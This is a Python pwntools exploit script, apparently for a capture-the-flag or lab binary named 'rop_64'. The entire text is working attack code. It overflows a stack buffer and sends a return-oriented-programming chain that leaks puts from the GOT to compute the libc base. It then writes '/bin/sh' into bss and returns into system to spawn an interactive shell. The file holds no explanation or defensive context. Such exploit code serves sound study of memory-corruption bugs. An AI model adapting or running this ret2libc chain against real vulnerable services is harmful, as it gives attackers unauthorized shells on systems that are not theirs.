from pwn import *

#context.log_level = 'debug'

p = process("./rop_64")

main = 0x4011bd
gets_plt = 0x401070
puts_plt = 0x401060
puts_got = 0x404018
bss = 0x404040 + 0x100
pop_rdi = 0x00401263

payload = b'A'*120
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(gets_plt)
payload += p64(main)

p.recvuntil(b"Time to do x64 ROP\n")
p.sendline(payload)

puts_addr = u64(p.recv(6) + b'\x00'*2)
p.recv(1)
libc_base = puts_addr - 0x80ed0
system = libc_base + 0x50d60

log.info("puts: " + hex(puts_addr))

p.sendline(b"/bin/sh\x00")

payload = b'A'*120
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(system)

p.recvuntil(b"Time to do x64 ROP\n")
p.sendline(payload)


p.interactive()